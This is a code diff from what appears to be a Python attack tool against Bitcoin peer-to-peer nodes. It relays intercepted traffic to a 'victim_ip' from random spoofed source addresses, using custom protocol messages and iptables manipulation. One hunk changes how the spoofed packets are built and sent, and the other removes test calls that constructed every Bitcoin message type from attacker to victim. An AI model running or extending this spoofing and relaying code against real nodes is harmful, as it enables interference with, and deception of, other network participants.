@@ -236,13 +236,13 @@ def packet_received(packet):
 				#packet[IP].dst = victim_ip
 
 				try:
-					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
-					#rand_socket.send(custom.to_bytes())
-					ip = IP(src = rand_ip, dst = victim_ip)
+					custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
+					rand_socket.send(custom.to_bytes())
+					"""ip = IP(src = rand_ip, dst = victim_ip)
 					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
 					new_packet = ip/tcp/packet[TCP].payload
 
-					rand_socket.send(bytes(new_packet))
+					rand_socket.send(bytes(new_packet))"""
 				except Exception as e:
 					print('Relaying message FAILED')
 					print(e)
@@ -294,35 +294,6 @@ if __name__ == '__main__':
 	alias_num = 0 # Increments each alias
 
 	initialize_network_info()
-
-
-	custom_packet('version',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('verack',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('addr',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('inv',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getdata',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('merkleblock',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getblocks',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getheaders',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('tx',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('headers',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('block',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getaddr',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('mempool',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('ping',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('pong',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('notfound',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filterload',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filteradd',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filterclear',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('sendheaders',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('feefilter',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('sendcmpct',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('cmpctblock',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getblocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('blocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('reject',attacker_ip, victim_ip, attacker_port, victim_port)
-
 	atexit.register(on_close)
 	cleanup_iptables()
 	backup_iptables()
